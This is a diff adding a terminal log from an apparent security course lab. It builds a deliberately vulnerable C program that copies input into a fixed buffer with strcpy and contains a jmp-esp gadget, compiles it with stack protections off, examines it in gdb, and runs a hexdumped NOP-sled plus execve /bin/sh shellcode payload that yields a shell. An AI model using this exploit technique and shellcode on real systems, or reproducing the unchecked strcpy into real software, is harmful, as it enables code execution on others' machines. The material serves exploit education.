@@ -1,0 +1,71 @@
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat victim_jmpesp.c
+#include <stdio.h>
+#include <string.h>
+
+void jmpesp() {
+   __asm__("jmp *%esp");
+}
+
+
+int main(int argc, char** argv)
+{
+  char buffer[80];
+  
+  strcpy(buffer, argv[1]);
+
+  return 0; 
+}
+
+
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ e4ff
+e4ff: command not found
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc victim_jmpesp.c -o victim_jmpesp -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb victim_jmpesp -q
+Reading symbols from victim_jmpesp...done.
+(gdb) info functions
+All defined functions:
+
+File victim_jmpesp.c:
+void jmpesp();
+int main(int, char **);
+
+Non-debugging symbols:
+0x080482ac  _init
+0x080482e0  strcpy@plt
+0x080482f0  __libc_start_main@plt
+0x08048310  _start
+0x08048340  __x86.get_pc_thunk.bx
+0x08048350  deregister_tm_clones
+0x08048380  register_tm_clones
+0x080483c0  __do_global_dtors_aux
+0x080483e0  frame_dummy
+0x08048440  __libc_csu_init
+0x080484a0  __libc_csu_fini
+0x080484a4  _fini
+(gdb) disass jmpesp
+Dump of assembler code for function jmpesp:
+   0x0804840b <+0>:	push   %ebp
+   0x0804840c <+1>:	mov    %esp,%ebp
+   0x0804840e <+3>:	jmp    *%esp
+   0x08048410 <+5>:	nop
+   0x08048411 <+6>:	pop    %ebp
+   0x08048412 <+7>:	ret    
+End of assembler dump.
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat victim_jmp.py > victim_jmpesp.py
+cat: victim_jmp.py: No such file or directory
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ python victim_jmpesp.py
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ hexdump -C payload_jmpesp
+00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+*
+00000050  90 90 90 90 0e 84 04 08  31 c0 50 68 6e 2f 73 68  |........1.Phn/sh|
+00000060  68 2f 2f 62 69 89 e3 99  52 53 89 e1 b0 0b cd 80  |h//bi...RS......|
+00000070
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_jmpesp $(cat payload_jmpesp)
+$ whoami
+user
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ exit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ 
+
